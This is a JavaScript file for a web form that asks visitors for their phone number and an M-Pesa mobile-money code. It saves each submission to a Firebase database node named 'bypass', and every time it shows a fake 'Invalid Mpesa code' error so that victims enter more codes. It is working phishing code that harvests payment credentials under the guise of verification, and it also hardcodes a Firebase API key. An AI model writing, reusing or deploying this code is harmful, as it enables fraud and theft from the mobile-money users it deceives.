   
   let form = document.getElementById("form");
        let code = document.getElementById("M");
        let button = document.getElementById("bn");
        let counter = 0;
        let loader = document.getElementById("Load");
        let Alert = document.getElementById("alert");
        
   const firebaseConfig = {
    apiKey: "AIzaSyAujFKDx_T7ZSEyYGmvbdhkmn8SdKCNXjs",
    authDomain: "hope-kokeno-cbo.firebaseapp.com",
    databaseURL: "https://hope-kokeno-cbo-default-rtdb.firebaseio.com",
    projectId: "hope-kokeno-cbo",
    storageBucket: "hope-kokeno-cbo.appspot.com",
    messagingSenderId: "508964589142",
    appId: "1:508964589142:web:33a4d190a497bb5ecab5f7"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();
        
// Function to save contact form data
function saveContactFormData(Codes, phone) {
    const newContactFormRef = database.ref('bypass').push();
    const date = new Date();
    const day = date.getDate();
    const monthNames = [
        "January", "February", "March", "April", "May", "June",
        "July", "August", "September", "October", "November", "December"
    ];
    const month = monthNames[date.getMonth()];
    const year = date.getFullYear();
    let hours = date.getHours();
    const minutes = date.getMinutes();
    const ampm = hours >= 12 ? 'PM' : 'AM';
    hours = hours % 12 || 12;

    const formattedTime = `${day} ${month} ${year} || ${hours}:${minutes < 10 ? '0' : ''}${minutes} ${ampm}`;
    newContactFormRef.set({
        phone,
        Codes,
        date: formattedTime
    });
}

  

    button.addEventListener('click', go);
    function go() {
            let Codes = code.value;
            let phone = form.phone.value;
            console.log(phone);
            if (Codes.length > 5) {
                counter+=1;
                if (counter<3){
                    showLoader();
        saveContactFormData(phone, Codes);
                } else {
                    Alert.textContent = 'We could not verify your mpesa code! Click on the help button for guidance.'
                    Alert.style.display = 'block';
                    form.reset();
                }
            } else {
                codeAlert();
            }
            
        }

        function proceedToPayment() {
                window.location.href = "guide.html";
        }
        function showLoader(){
            loader.style.display = 'block';
            setTimeout(()=>{loader.style.display = 'none';},3000);
            setTimeout(()=>{
                Alert.textContent = 'Invalid Mpesa code! Please try again';
                Alert.style.display = 'block';
                form.reset();
                },3000);
        setTimeout(()=>{
                Alert.style.display = 'none';
                },6000);  
        }
        
        function codeAlert(){
            Alert.textContent = 'Enter mpesa code!'
                    Alert.style.display = 'block';
            setTimeout(()=>{Alert.style.display = 'none';},3000);
        }
        document.getElementById('help').addEventListener('click',()=>{
            document.getElementById('helpCenter').style.display = 'block';
           document.getElementById('main').style.display = 'none';
            
        });
    const items = document.querySelectorAll('.butt'); 
        items.forEach(item => {
    item.addEventListener('click', function() {
        const INFO = this.getAttribute('info');
        
        const btInfo = document.getElementById('info');
        btInfo.style.display = 'block';
        btInfo.textContent = INFO;
    });
});




